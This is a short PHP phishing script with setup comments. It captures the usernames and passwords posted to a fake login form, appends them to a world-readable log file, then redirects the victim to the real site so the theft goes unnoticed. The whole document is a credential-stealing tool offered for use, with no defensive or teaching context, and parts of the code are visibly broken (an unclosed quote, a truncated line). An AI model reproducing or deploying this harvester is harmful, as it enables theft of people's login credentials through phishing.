//Create a file called log in the same directory with this script.
//touch log
//chmod a+r log

<?php
if($_SERVER['REQUEST_METHOD'] == 'POST')
{
$pished_user = $_POST['username_variable];
$pished_pass = $_POST['password_variable'];
$fp = fopen('log', 'a');
fwrite($fp, "Username:      " . $pished_user . "\r\n");
fwrite($fp, "Password:    " .$pished_pass. "\r\n*******************************$
fclose($fp);
header('location: Real Website Adress');

}
?>
